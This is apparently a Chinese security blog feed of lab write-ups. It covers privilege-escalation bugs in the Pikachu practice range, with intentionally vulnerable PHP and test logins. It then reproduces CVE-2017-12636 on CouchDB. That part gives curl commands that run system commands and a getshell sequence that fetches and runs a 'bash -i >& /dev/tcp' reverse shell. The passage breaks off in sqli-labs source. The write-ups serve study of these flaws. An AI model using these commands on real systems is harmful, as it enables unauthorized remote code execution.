class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class="main-content"&gt;</span><br><span class="line">    &lt;div class="main-content-inner"&gt;</span><br><span class="line">        &lt;div class="breadcrumbs ace-save-state" id="breadcrumbs"&gt;</span><br><span class="line">            &lt;ul class="breadcrumb"&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;i class="ace-icon fa fa-home home-icon"&gt;&lt;/i&gt;</span><br><span class="line">                    &lt;a href=<span class="string">"../op.php"</span>&gt;Over Permission&lt;/a&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li class="active"&gt;op1 member&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;&lt;!-- /.breadcrumb --&gt;</span><br><span class="line">            &lt;a href=<span class="string">"#"</span> style=<span class="string">"float:right"</span> data-container=<span class="string">"body"</span> data-toggle=<span class="string">"popover"</span> data-placement=<span class="string">"bottom"</span> title=<span class="string">"tips(再点一下关闭)"</span></span><br><span class="line">               data-content=<span class="string">"这里可以查别人的信息吗?"</span>&gt;</span><br><span class="line">                点一下提示~</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="page-content"&gt;</span><br><span class="line">            &lt;div id=<span class="string">"mem_main"</span>&gt;</span><br><span class="line">                &lt;p class="mem_title"&gt;欢迎来到个人信息中心  | &lt;a style="color:bule;" href="op1_mem.php?logout=1"&gt;退出登录&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">                &lt;form class="msg1" method="get"&gt;</span><br><span class="line">                    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"username"</span> value=<span class="string">"&lt;?php echo $_SESSION['op']['username']; ?&gt;"</span> /&gt;</span><br><span class="line">                    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"点击查看个人信息"</span> /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $html;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;&lt;!-- /.page-content --&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&lt;!-- /.main-content --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR . <span class="string">'footer.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从代码里可以看出，$username变量可控，而且没做任何过判断，存在水平越权<br>这里有两个用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username:lili</span><br><span class="line">password:123456</span><br><span class="line"></span><br><span class="line">username:lucy</span><br><span class="line">password:12346</span><br></pre></td></tr></table></figure></p><p>用lili的登录查询个人信息<br><img src="https://s2.ax1x.com/2019/02/10/kUqcTg.png" alt="kUqcTg.png"></p><p>尝试将lili修改为lucy<br><img src="https://s2.ax1x.com/2019/02/10/kUqWfs.png" alt="kUqWfs.png"></p><p>成功查询到lucy的个人信息</p><p>垂直越权：<br>op2_admin_edit.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by runner.han</span></span><br><span class="line"><span class="comment"> * There is nothing new under the sun</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$SELF_PAGE = substr($_SERVER[<span class="string">'PHP_SELF'</span>],strrpos($_SERVER[<span class="string">'PHP_SELF'</span>],<span class="string">'/'</span>)+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($SELF_PAGE = <span class="string">"op2_admin_edit.php"</span>)&#123;</span><br><span class="line">    $ACTIVE = <span class="keyword">array</span>(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'active open'</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'active'</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line">$PIKA_ROOT_DIR =  <span class="string">"../../../"</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR . <span class="string">'header.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR.<span class="string">'inc/mysql.inc.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR.<span class="string">'inc/function.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR.<span class="string">'inc/config.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$link=connect();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span></span><br><span class="line"><span class="keyword">if</span>(!check_op2_login($link))&#123;</span><br><span class="line">    header(<span class="string">"location:op2_login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'username'</span>]!=<span class="keyword">null</span> &amp;&amp; $_POST[<span class="string">'password'</span>]!=<span class="keyword">null</span>)&#123;<span class="comment">//用户名密码必填</span></span><br><span class="line">        $getdata=escape($link, $_POST);<span class="comment">//转义</span></span><br><span class="line">        $query=<span class="string">"insert into member(username,pw,sex,phonenum,email,address) values('&#123;$getdata['username']&#125;',md5('&#123;$getdata['password']&#125;'),'&#123;$getdata['sex']&#125;','&#123;$getdata['phonenum']&#125;','&#123;$getdata['email']&#125;','&#123;$getdata['address']&#125;')"</span>;</span><br><span class="line">        $result=execute($link, $query);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_affected_rows($link)==<span class="number">1</span>)&#123;<span class="comment">//判断是否插入</span></span><br><span class="line">            header(<span class="string">"location:op2_admin.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            $html.=<span class="string">"&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'logout'</span>]) &amp;&amp; $_GET[<span class="string">'logout'</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">    session_unset();</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(session_name(),<span class="string">''</span>,time()<span class="number">-3600</span>,<span class="string">'/'</span>);</span><br><span class="line">    header(<span class="string">"location:op2_login.php"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class="main-content"&gt;</span><br><span class="line">    &lt;div class="main-content-inner"&gt;</span><br><span class="line">        &lt;div class="breadcrumbs ace-save-state" id="breadcrumbs"&gt;</span><br><span class="line">            &lt;ul class="breadcrumb"&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;i class="ace-icon fa fa-home home-icon"&gt;&lt;/i&gt;</span><br><span class="line">                    &lt;a href=<span class="string">"../op.php"</span>&gt;Over Permission&lt;/a&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li class="active"&gt;op2 admin edit&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;&lt;!-- /.breadcrumb --&gt;</span><br><span class="line">            &lt;a href=<span class="string">"#"</span> style=<span class="string">"float:right"</span> data-container=<span class="string">"body"</span> data-toggle=<span class="string">"popover"</span> data-placement=<span class="string">"bottom"</span> title=<span class="string">"tips(再点一下关闭)"</span></span><br><span class="line">               data-content=<span class="string">"想知道当超级boss是什么滋味吗"</span>&gt;</span><br><span class="line">                点一下提示~</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="page-content"&gt;</span><br><span class="line">            &lt;div id=<span class="string">"edit_main"</span>&gt;</span><br><span class="line">                &lt;p class="edit_title"&gt;hi,&lt;?php if($_SESSION['op2']['username'])&#123;echo $_SESSION['op2']['username'];&#125; ?&gt;,欢迎来到后台管理中心 | &lt;a style="color:bule;" href="op2_admin_edit.php?logout=1"&gt;退出登录&lt;/a&gt;|&lt;a href="op2_admin.php"&gt;回到admin&lt;/a&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">                &lt;form class="from_main" method="post"&gt;</span><br><span class="line">                    &lt;label&gt;用户:&lt;br /&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"必填"</span>/&gt;&lt;/label&gt;&lt;br /&gt;</span><br><span class="line">                    &lt;label&gt;密码:&lt;br /&gt;&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"必填"</span>/&gt;&lt;/label&gt;&lt;br /&gt;</span><br><span class="line">                    &lt;label&gt;性别:&lt;br /&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"sex"</span> /&gt;&lt;/label&gt;&lt;br /&gt;</span><br><span class="line">                    &lt;label&gt;电话:&lt;br /&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"phonenum"</span> /&gt;&lt;/label&gt;&lt;br /&gt;</span><br><span class="line">                    &lt;label&gt;邮箱:&lt;br /&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"email"</span> /&gt;&lt;/label&gt;&lt;br /&gt;</span><br><span class="line">                    &lt;label&gt;地址:&lt;br /&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"address"</span> /&gt;&lt;/label&gt;&lt;br /&gt;</span><br><span class="line">                    &lt;input class="sub" type="submit" name="submit" value="创建" /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;&lt;!-- /.page-content --&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&lt;!-- /.main-content --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR . <span class="string">'footer.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>有两个用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/123456,pikachu/000000,admin是超级boss</span><br></pre></td></tr></table></figure></p><p>用pikachu登录<br><img src="https://s2.ax1x.com/2019/02/10/kUj45F.png" alt="kUj45F.png"></p><p>直接访问admin_edit.php<br><img src="https://s2.ax1x.com/2019/02/10/kUjXVK.png" alt="kUjXVK.png"><br>可以为所欲为了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><hr><p>在学习此漏洞之前看了一些有关越权的文章<br>Referer：<br><a href="https://paper.tuisec.win/detail/0cd79c338850fda" target="_blank" rel="noopener">逻辑让我崩溃之越权姿势分享</a><br><a href="https://paper.tuisec.win/detail/c9e403c66a43b16" target="_blank" rel="noopener">逻辑让我崩溃之越权姿势分享(续集)</a><br><a href="https://paper.tuisec.win/detail/f291ea2a5a02acd" target="_blank" rel="noopener">黑盒测试 | 某招聘系统CSRF越权修改</a><br><a href="https://paper.tuisec.win/detail/5a915c2f0ad519e" target="_blank" rel="noopener">SRCMS 多处越权+权限提升管理员漏洞</a><br><a href="https://paper.tuisec.win/detail/eadb720f9336bed" target="_blank" rel="noopener">ebay旗下电商平台magento go越权管理任意店铺</a><br><a href="https://www.secquan.org/News/1068176" target="_blank" rel="noopener">https://www.secquan.org/News/1068176</a></p><p>挖越权时注意一下几点：</p><ul><li style="list-style: none"><input type="checkbox"> 抓包看请求头和参数，能改的都改一下看一下会不会返回不同的</li><li style="list-style: none"><input type="checkbox"> 如果表单里面有个/添加个value是否会显示出来从而越权，</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox"> 通过收集请求变量名然后对应返回的结果，用Burp进行Fuzz测试有可能可以越权</li><li style="list-style: none"><input type="checkbox"> 登录或者执行其他操作的时候数据包里是否有判断权限的参数如果有修改一下是否能达到垂直越权</li><li style="list-style: none"><input type="checkbox"> 去掉一些参数进行请求能否获取一样的数据？或者说返回报错信息，如果是加密信息构造明文信息是否返回一样的结果？</li><li style="list-style: none"><input type="checkbox"> 如果是白盒测试，注意是否有对进行查询的参数进行过滤？自行修改能否越权</li><li style="list-style: none"><input type="checkbox"> 白盒测试时，如果审计代码时发现某个敏感目录没有做权限判断可以直接访问那么就找到一个越权了</li><li style="list-style: none"><input type="checkbox"> 在请求的时候进行HTTP污染能否达到越来权？比如多增加一个一样的请求名</li></ul><p>挖越权之前可以看一下上面的文章找一下感觉</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-12636 recurrent</title>
      <link href="/posts/67b377fa.html"/>
      <url>/posts/67b377fa.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>继续复现CVE，这次是CVE-2017-12636<br><img src="http://n.sinaimg.cn/front/400/w1280h720/20190110/t1hw-hrkkweh6498780.jpg" alt="t1hw-hrkkweh6498780.jpg"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><hr><p>CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在query_server中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的Restful API接口动态修改保存配置，从而执行系统命令<br>这里我只复现1.6版本的</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr><p>下载vulhub，进入对应CVE文件夹，执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>搭建成功后访问，能看到如下图所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5983</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqK4s.png" alt="kNqK4s.png"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><hr><p>利用要求：需要拥有一个管理员账号<br>使用CVE-2017-12635来添加一个账号<br><img src="https://s2.ax1x.com/2019/02/09/kNq1g0.png" alt="kNq1g0.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:vulhub</span><br><span class="line">password:vulhub</span><br></pre></td></tr></table></figure></p><p>依次执行以下命令则可命令执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure></p><p>结果如下：<br><img src="https://s2.ax1x.com/2019/02/09/kNqNE4.png" alt="kNqNE4.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqDv6.png" alt="kNqDv6.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><hr><p>操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.先用nc在kali监听nc -lvp 9999</span><br><span class="line">2.用python -m SimpleHttpsServer 8083在kali搭建一个简单的http服务</span><br><span class="line">3.在根目录创建一个index.html写入bash -i &gt;&amp; /dev/tcp/192.168.241.128/9000 0&gt;&amp;1</span><br><span class="line">4.执行以下命令即可获得一个shell</span><br></pre></td></tr></table></figure></p><p>命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@192.168.241.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;curl 192.168.241.128:8083/ -o /tmp/bashshell&quot;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br><span class="line">curl -X PUT http://vulhub:vulhub@192.168.241.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;bash /tmp/bashshell&quot;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure></p><p>我这里将命令扔进demo.sh</p><p><img src="https://s2.ax1x.com/2019/02/09/kNq2UH.png" alt="kNq2UH.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqbVg.md.png" alt="kNqbVg.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqL5j.md.png" alt="kNqL5j.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNLSMV.png" alt="kNLSMV.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 41 -&gt; Less 45</title>
      <link href="/posts/a2e73b2e.html"/>
      <url>/posts/a2e73b2e.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>继续闯sqli-labs，这次从41到45关。感觉后面的都是用来复习的<br><img src="http://i2.hdslb.com/bfs/archive/ca6c6074431a74787b0b6ea99d8605702cdefe7e.jpg" alt="ca6c6074431a74787b0b6ea99d8605702cdefe7e.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p> <b>第四十一关</b></p><hr><p> 代码如下：<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-41</span> **stacked Query Intiger type blind**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span 